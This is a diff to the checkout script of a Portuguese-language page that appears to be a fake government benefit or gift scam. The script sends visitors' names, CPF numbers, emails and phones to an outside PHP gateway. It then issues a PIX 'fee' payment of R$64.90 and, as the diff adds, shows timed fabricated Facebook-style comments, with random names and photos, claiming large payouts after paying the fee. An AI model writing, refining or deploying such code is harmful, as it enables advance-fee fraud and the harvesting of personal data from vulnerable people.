@@ -293,109 +293,172 @@ fbq('track', 'PageView');
 </footer>
 
 <script>
-  // CONFIGURAÇÃO DA PONTE BLINDADA
-  var MEU_PHP_GATEWAY = 'https://kitbrinde.online/processar.php'; 
-  var PIX_VALOR_CENTS   = 6490;
-  var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
+    // --- CONFIGURAÇÃO DA PONTE BLINDADA ---
+    var MEU_PHP_GATEWAY = 'https://kitbrinde.online/processar.php'; 
+    var PIX_VALOR_CENTS   = 6490;
+    var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
 
-  var _pixCode='',_pixTxid='',_pixTimer=null,_pixQRFeito=false;
-  var _p=new URLSearchParams(window.location.search);
-  var _nome=(_p.get('nome')||'').trim();
-  var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
-  var _email=(_p.get('email')||'cliente@email.com').trim();
-  var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
+    var _pixCode='',_pixTxid='',_pixTimer=null;
+    var _p=new URLSearchParams(window.location.search);
+    var _nome=(_p.get('nome')||'').trim();
+    var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
+    var _email=(_p.get('email')||'cliente@email.com').trim();
+    var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
 
-  function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
-  function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
+    function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
+    function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
 
-  var nomeOk=formatarNome(_nome);
-  if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
+    var nomeOk=formatarNome(_nome);
+    if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
 
-  function trackPurchase() {
-    var data = { content_name: 'Conjunto de Panelas LIFE SMILE 29', value: parseFloat((PIX_VALOR_CENTS/100).toFixed(2)), currency: 'BRL' };
-    try {
-        if(typeof fbq !== 'undefined') fbq('track', 'Purchase', data);
-        if(typeof ttq !== 'undefined') ttq.track('CompletePayment', data);
-    } catch(e) {}
-  }
+    async function pixIniciar(){
+        document.getElementById('pix-loading').style.display='block';
+        try{
+            var utmStr = window.location.search.replace(/^\?/, "");
+            var payload = {
+                customer: {
+                    name: nomeOk || 'Cliente',
+                    email: _email,
+                    phone: _fone.replace(/\D/g,''),
+                    document: _cpf.replace(/\D/g,'')
+                },
+                utm: utmStr
+            };
+            var res = await fetch(MEU_PHP_GATEWAY, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            var data = await res.json();
+            if(!res.ok || !data.pixCode) throw new Error();
+            _pixTxid = data.transactionId;
+            _pixCode = data.pixCode;
 
-  async function pixIniciar(){
-    document.getElementById('pix-loading').style.display='block';
-    document.getElementById('pix-main').style.display='none';
-    try{
-      var utmStr = window.location.search.replace(/^\?/, "");
-      var payload = {
-        customer: {
-          name: nomeOk || 'Cliente',
-          email: _email,
-          phone: _fone.replace(/\D/g,''),
-          document: _cpf.replace(/\D/g,'')
-        },
-        utm: utmStr
-      };
-      var res = await fetch(MEU_PHP_GATEWAY, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      var data = await res.json();
-      if(!res.ok || !data.pixCode) throw new Error();
-      _pixTxid = data.transactionId;
-      _pixCode = data.pixCode;
+            document.getElementById('pix-nome-show').textContent = nomeOk;
+            document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
+            document.getElementById('pix-code-box').textContent = _pixCode;
+            document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
+            document.getElementById('pix-loading').style.display = 'none';
+            document.getElementById('pix-main').style.display = 'block';
+            pixPolling();
+        }catch(err){ document.getElementById('pix-loading').style.display='none'; alert('Erro ao gerar PIX.'); }
+    }
 
-      document.getElementById('pix-nome-show').textContent = nomeOk;
-      document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
-      document.getElementById('pix-valor-label').textContent = 'R$ 64,90';
-      document.getElementById('pix-code-box').textContent = _pixCode;
-      document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
-      document.getElementById('pix-loading').style.display = 'none';
-      document.getElementById('pix-main').style.display = 'block';
-      pixPolling();
-    }catch(err){ document.getElementById('pix-loading').style.display='none'; alert('Erro ao gerar PIX.'); }
-  }
+    function pixPolling(){
+        _pixTimer=setInterval(async function(){
+            try{
+                var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
+                var s = await r.json();
+                if(s.status === 'COMPLETED' || s.status === 'PAID'){
+                    clearInterval(_pixTimer);
+                    window.location.href=PIX_REDIRECT;
+                }
+            }catch(e){}
+        },5000);
+    }
 
-  function pixPolling(){
-    _pixTimer=setInterval(async function(){
-      try{
-        var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
-        var s = await r.json();
-        if(s.status === 'COMPLETED' || s.status === 'PAID'){
-          clearInterval(_pixTimer);
-          trackPurchase();
-          window.location.href=PIX_REDIRECT;
+    function pixAba(aba){
+        document.getElementById('ptab-copia').classList.toggle('on',aba==='copia');
+        document.getElementById('ptab-qr').classList.toggle('on',aba==='qr');
+        document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
+        document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
+    }
+
+    function pixCopiar(){
+        navigator.clipboard.writeText(_pixCode).then(function(){
+            var btn=document.getElementById('pix-copy-btn'); var orig=btn.innerHTML;
+            btn.innerHTML='<i class="fas fa-check"></i><span>COPIADO!</span>';
+            setTimeout(function(){btn.innerHTML=orig;},2000);
+        });
+    }
+
+    // --- LOGICA DE COMENTARIOS AVANÇADA (SALVA NO LOCAL E GERA NOVOS) ---
+    var totalComments = 25738;
+    var storedComments = [];
+    const fbHeaderOutside = document.getElementById('fb-header-outside');
+    const fbCountSpan = document.getElementById('fb-comment-count');
+    const fbLoadingSpan = document.getElementById('fb-loading');
+    const fbContainer = document.getElementById('fb-comments-container');
+
+    function initFacebookComments() {
+        fbHeaderOutside.textContent = `Comentários (${totalComments})`;
+        const local = localStorage.getItem('commentsData');
+        if (local) {
+            storedComments = JSON.parse(local);
+            storedComments.forEach(comm => createComment(comm.name, comm.avatar, comm.text, comm.likes, comm.dislikes, false));
+            fbCountSpan.textContent = `Comentários: ${totalComments}`;
+            fbLoadingSpan.textContent = "Comentários atualizados.";
+            scheduleComments();
+        } else {
+            generateInitialComments();
         }
-      }catch(e){}
-    },5000);
-  }
+    }
 
-  function pixAba(aba){
-    document.getElementById('ptab-copia').classList.toggle('on',aba==='copia');
-    document.getElementById('ptab-qr').classList.toggle('on',aba==='qr');
-    document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
-    document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
-  }
+    function generateInitialComments() {
+        const texts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
+        texts.forEach(text => createRandomComment(text, true));
+        fbCountSpan.textContent = `Comentários: ${totalComments}`;
+        fbLoadingSpan.textContent = "Comentários atualizados.";
+        scheduleComments();
+    }
 
-  function pixCopiar(){
-    navigator.clipboard.writeText(_pixCode).then(function(){
-      var btn=document.getElementById('pix-copy-btn'); var orig=btn.innerHTML;
-      btn.innerHTML='<i class="fas fa-check"></i><span>COPIADO!</span>';
-      setTimeout(function(){btn.innerHTML=orig;},2000);
-    });
-  }
+    function scheduleComments() {
+        const messages = [
+            "Alguém conseguiu R$ 2.700 hoje?",
+            "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
+            "Testei hoje e entrou R$ 2.100 rapidinho!",
+            "Show! Liberou R$ 4.250 e já usei tudo!",
+            "Recebi R$ 5.000, só precisei pagar a taxa",
+            "O meu acabou de cair, valeu galera!",
+            "Alguem de SP ja recebeu?",
+            "Acabei de fazer o pagamento da taxa, aguardando..."
+        ];
+        messages.forEach((msg, i) => {
+            setTimeout(() => {
+                fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
+                createRandomComment(msg, false);
+                fbLoadingSpan.textContent = "Comentários atualizados.";
+                fbHeaderOutside.textContent = `Comentários (${++totalComments})`;
+            }, (i + 1) * 10000); // Aparece um novo a cada 10 segundos
+        });
+    }
 
-  // --- COMENTÁRIOS ORIGINAIS (EXATAMENTE IGUAIS AOS SEUS) ---
-  var totalComments=25738,storedComments=[];
-  function initFacebookComments(){
-    document.getElementById('fb-header-outside').textContent='Comentários ('+totalComments+')';
-    generateInitialComments();
-  }
-  function generateInitialComments(){['Tive medo, mas entrou R$ 2.400!','Tive que pagar taxa, mas veio R$ 2.800 em 10min','Recebi R$ 4.000 deu para pagar as contas kkk'].forEach(function(t){createRandomComment(t,true);});}
-  async function createRandomComment(text,initial){var ud=await getRandomUser();createComment(ud.name.first,ud.picture.medium,text,0,0,initial);}
-  function createComment(name,avatar,text,likes,dislikes,initialLoad){var el=document.createElement('div');el.classList.add('comment-item');el.innerHTML='<img class="comment-avatar" src="'+avatar+'"/><div class="comment-content"><div class="comment-name">'+name+'</div><div class="comment-text">'+text+'</div><div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span></div></div>';var c=document.getElementById('fb-comments-container');c.insertBefore(el,c.firstChild);}
-  async function getRandomUser(){var r=await fetch('https://randomuser.me/api/?nat=br');return(await r.json()).results[0];}
+    async function createRandomComment(text, initial) {
+        const userData = await getRandomUser();
+        createComment(userData.name.first, userData.picture.medium, text, Math.floor(Math.random()*10), 0, initial);
+        storedComments.unshift({ name: userData.name.first, avatar: userData.picture.medium, text, likes: 0, dislikes: 0 });
+        saveCommentsToLocal();
+    }
 
-  initFacebookComments();
-  pixIniciar();
+    function createComment(name, avatar, text, likes, dislikes, initialLoad) {
+        const cItem = document.createElement('div');
+        cItem.classList.add('comment-item');
+        cItem.innerHTML = `
+            <img class="comment-avatar" src="${avatar}" alt="avatar"/>
+            <div class="comment-content">
+              <div class="comment-name">${name}</div>
+              <div class="comment-text">${text}</div>
+              <div class="comment-actions">
+                <span class="comment-likes"><i class="fas fa-thumbs-up"></i> ${likes}</span>
+                <span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> ${dislikes}</span>
+              </div>
+            </div>`;
+        fbContainer.insertBefore(cItem, fbContainer.firstChild);
+    }
+
+    async function getRandomUser() {
+        const res = await fetch('https://randomuser.me/api/?nat=br');
+        const data = await res.json();
+        return data.results[0];
+    }
+
+    function saveCommentsToLocal() {
+        localStorage.setItem('commentsData', JSON.stringify(storedComments));
+    }
+
+    // Inicializar
+    initFacebookComments();
+    pixIniciar();
 </script>
 </body>
 </html>
